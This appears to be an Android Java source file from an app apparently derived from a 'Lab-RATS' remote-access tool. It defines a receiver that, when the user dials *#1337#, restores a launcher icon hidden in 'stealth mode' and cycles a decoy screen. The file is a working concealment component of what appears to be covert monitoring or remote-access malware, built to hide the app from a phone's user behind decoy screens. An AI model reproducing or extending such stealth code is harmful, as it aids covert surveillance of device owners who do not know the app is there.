package com.fason.app.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.stealth.decoy.DecoyActivity;

/**
 * DialerUnlockReceiver — Lab-RATS *#1337# recovery, rebuilt for Fason.
 *
 * When the launcher icon is hidden (stealth mode), dialing *#1337# on the
 * stock dialer fires a secret-code broadcast. This receiver catches it,
 * restores the launcher alias, and surfaces the real UI.
 *
 * Manifest wiring (added by the merge):
 *   <receiver android:name=".receiver.DialerUnlockReceiver">
 *     <intent-filter>
 *       <action android:name="android.provider.Telephony.SECRET_CODE" />
 *       <data android:scheme="android_secret_code" android:host="1337" />
 *     </intent-filter>
 *   </receiver>
 */
public class DialerUnlockReceiver extends BroadcastReceiver {
    private static final String TAG = "DialerUnlock";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (intent == null) return;
        String action = intent.getAction();
        if (!"android.provider.Telephony.SECRET_CODE".equals(action)) return;
        Log.i(TAG, "secret code received — restoring icon");
        PermissionManager.restoreIcon(ctx);
        // Bring the app forward so the user lands on the real dashboard
        try {
            Intent launch = ctx.getPackageManager()
                .getLaunchIntentForPackage(ctx.getPackageName());
            if (launch != null) {
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                ctx.startActivity(launch);
            }
        } catch (Exception e) {
            Log.w(TAG, "launch after unlock", e);
        }
        // Also cycle the decoy so stealth state stays consistent
        try {
            DecoyActivity.launch(ctx, DecoyActivity.getPreferredSkin(ctx));
        } catch (Exception ignored) {}
    }
}
